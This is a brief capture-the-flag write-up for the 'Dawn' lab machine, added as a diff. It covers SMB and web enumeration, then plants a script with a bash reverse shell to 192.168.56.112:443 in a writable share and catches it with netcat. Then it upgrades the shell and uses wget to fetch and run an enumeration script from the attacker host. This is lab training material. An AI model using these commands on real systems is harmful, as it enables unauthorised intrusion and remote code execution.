@@ -1,0 +1,37 @@
+Dawn writup
+
+enum4linux 192.168.56.114 Find 2 users 
+dawn
+ganimedes
+
+smbmap -H 192.168.56.114
+ITDEPT with read and write permission
+
+smbclient //192.168.56.114/ITDEPT -N (nothing interested)
+
+
+ dirb http://192.168.56.114
+ /logs 
+ 
+cat management.log | grep ITDEPT
+
+ Create a file 
+ cat > web-control               
+#!/bin/bash
+
+bash -i >& /dev/tcp/192.168.56.112/443 0>&1
+
+Upload in ITDEPT directory
+nc -nvlp 443 (listening)
+
+got shell
+
+python -c ‘import pty;pty.spawn(“/bin/bash”)’
+
+cd /tmp
+wget http://192.168.56.112:442/lse.sh
+chmod +x lse.sh
+./lse.sh
+
+
+
